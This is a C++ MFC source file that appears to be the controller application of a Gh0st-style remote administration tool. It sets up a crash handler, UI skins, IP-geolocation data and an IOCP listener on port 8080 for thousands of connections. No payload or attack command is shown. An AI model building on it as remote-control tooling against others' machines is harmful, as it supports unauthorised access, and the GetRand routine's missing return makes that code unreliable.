// Client.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "Client.h"
#include "CheckPass.h"
#include "MainFrm.h"
#include "ClientDoc.h"
#include "TabView.h"
#include "MainFrm.h"
#include "SkinH.h"
//#include "StartupDlg.h"//启动画面
#pragma comment(lib, "SkinH.lib")
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	char buff[1024];
	memset(buff, 0, sizeof(buff));
	wsprintf
		(buff, 
		"CRASH CODE:0x%.8x ADDR=0x%.8x FLAGS=0x%.8x PARAMS=0x%.8x\n"
		"eax=%.8x ebx=%.8x ecx=%.8x\nedx=%.8x esi=%.8x edi=%.8x\neip=%.8x esp=%.8x ebp=%.8x\n",
		ExceptionInfo->ExceptionRecord->ExceptionCode,
		ExceptionInfo->ExceptionRecord->ExceptionAddress,
		ExceptionInfo->ExceptionRecord->ExceptionFlags,
		ExceptionInfo->ExceptionRecord->NumberParameters,
		ExceptionInfo->ContextRecord->Eax,
		ExceptionInfo->ContextRecord->Ebx,
		ExceptionInfo->ContextRecord->Ecx,
		ExceptionInfo->ContextRecord->Edx,
		ExceptionInfo->ContextRecord->Esi,
		ExceptionInfo->ContextRecord->Edi,
		ExceptionInfo->ContextRecord->Eip,
		ExceptionInfo->ContextRecord->Esp,
		ExceptionInfo->ContextRecord->Ebp
		);
	
	MessageBox(NULL, buff, _T("ExceptionInfo"), MB_OK);
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	dbg_dump(ExceptionInfo);
	// 不退出
	return true;
	/*ExitProcess(0);*/
}

/////////////////////////////////////////////////////////////////////////////
// CClientApp

BEGIN_MESSAGE_MAP(CClientApp, CWinApp)
	//{{AFX_MSG_MAP(CClientApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
END_MESSAGE_MAP()

DWORD CClientApp::GetRand()
{
	typedef DWORD (WINAPI *tGetRandNum)();
	tGetRandNum pGetRandNum = (tGetRandNum)GetProcAddress(m_hModule,"GetRandNum");
	
	if(pGetRandNum)
		return pGetRandNum();
}

/////////////////////////////////////////////////////////////////////////////
// CClientApp construction

CClientApp::CClientApp()
{
	// 初始化本进程的图像列表, 为加载系统图标列表做准备
	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
	pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(LoadLibrary("shell32.dll"), (LPCSTR)660);
	FileIconInit(TRUE);
	
	char szQQwryPath[MAX_PATH]={0};
	GetModuleFileName(NULL,AppPath,MAX_PATH);
	*strrchr(AppPath,'\\') = 0;
	sprintf(szQQwryPath,"%s\\Plugins\\QQwry.dat",AppPath);
	
	HANDLE	hFile = CreateFile(szQQwryPath, 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
		m_SeuQQwry.SetPath(szQQwryPath);
	CloseHandle(hFile);
	
	m_bIsDisablePopTips = m_IniFile.GetInt(_T("Settings"), _T("PopTips"), false);
	m_bisDisableSound = m_IniFile.GetInt(_T("Settings"), _T("Sound"), false);
	m_pConnectView = NULL;
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CClientApp object

CClientApp theApp;
/////////////////////////////////////////////////////////////////////////////
// CClientApp initialization







BOOL CClientApp::InitInstance()
{


		
     
/*
		if (((CClientApp *)AfxGetApp())->m_IniFile.GetString("Settings", "Skin", "") == "")
		{
			HGLOBAL hRes;
			HRSRC hResInfo;
			HINSTANCE hinst = AfxGetInstanceHandle();
			hResInfo = FindResource(hinst, MAKEINTRESOURCE(IDR_SKIN), "SKIN");
			if (hResInfo != NULL)
			{
				hRes = LoadResource(hinst, hResInfo);
				if (hRes != NULL)
				{
					SkinH_AttachRes((LPBYTE)hRes, SizeofResource(hinst,hResInfo), NULL, 0, 0, 0);
					//SkinH_SetAero(FALSE);//透明特效开关TRUE/FALSE
					FreeResource(hRes);
				}
			}
		}
		else
		{
			CString strSkinFile = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Settings", "Skin", "SkinH.she");
			HANDLE	hFile = CreateFile("SkinH.dll", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
			if (hFile != INVALID_HANDLE_VALUE)
			{
				//SkinH_SetAero(TRUE);//Aero透明特效
				//SkinH_SetMenuAlpha(200);
				SkinH_AttachEx(strSkinFile,NULL);
			}
		}*/

	//SkinH_AdjustHSV(178,78,-7);
	
	SetUnhandledExceptionFilter(bad_exception);
	AfxEnableControlContainer();
	if(m_IniFile.GetInt("Settings", "SKIN"))
				{
		char Path[200]={0};
		GetModuleFileName(NULL,Path,200);
		*strrchr(Path,'\\')=0;
		strcat(Path,"\\Skins\\SkinH.she");
		SkinH_AttachEx(Path,NULL);
	}
	// Standard initialization
	// If you are not using these features and wish to reduce the size
	// of your final executable, you should remove from the following
	// the specific initialization routines you do not need.
	
#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif
// 	CStartupDlg dlg;
//     dlg.DoModal();   //启动画面
	/*****************************************************************************/
	//(FuckTheCreaker)
	
	/*****************************************************************************/
	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
	//SetRegistryKey(_T("Local AppWizard-Generated Applications"));
	
	//LoadStdProfileSettings(0);  // Load standard INI file options (including MRU)
	
	// Register the application's document templates.  Document templates
	// serve as the connection between documents, frame windows and views.
	
	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CClientDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CTabView));
	AddDocTemplate(pDocTemplate);
	
	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);
	
	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;
	
	// 去掉菜单栏
	//m_pMainWnd->SetMenu(NULL);
	// The one and only window has been initialized, so show and update it.
	
	m_pMainWnd->ShowWindow(SW_SHOW);
	m_pMainWnd->UpdateWindow();
	
	// 启动IOCP服务器
	int	nPort = m_IniFile.GetInt("Settings", "ListenPort");
	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");
	if (nPort == 0)
		nPort = 8080;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	
	if (m_IniFile.GetInt("Settings", "MaxConnectionAuto"))
		nMaxConnection = 8000;
	
	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);
	
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CClientApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

